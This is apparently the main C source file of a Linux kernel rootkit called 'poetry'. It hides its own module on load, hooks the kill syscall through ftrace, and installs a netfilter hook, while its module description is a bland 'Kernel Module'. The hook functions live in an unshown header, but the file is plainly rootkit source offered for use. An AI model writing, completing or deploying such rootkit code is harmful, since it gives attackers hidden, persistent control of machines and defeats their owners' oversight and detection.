#include "inc/poet.h"

static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
	// HOOK("sys_delete_module", hook_delete_module, &orig_delete_module)
};

static int __init rk_init(void){
    int err;

	hideme(); // hide module by default

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "poetry: loaded\n");

    nf_register_net_hook(&init_net, &my_nfho);
    printk(KERN_INFO "poetry: netfilter installed\n");

    return 0;
}

static void __exit rk_cleanup(void){
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    nf_unregister_net_hook(&init_net, &my_nfho);
    printk(KERN_INFO "poetry: unloaded\n");
}

module_init(rk_init);
module_exit(rk_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kindtime");
MODULE_DESCRIPTION("Kernel Module");
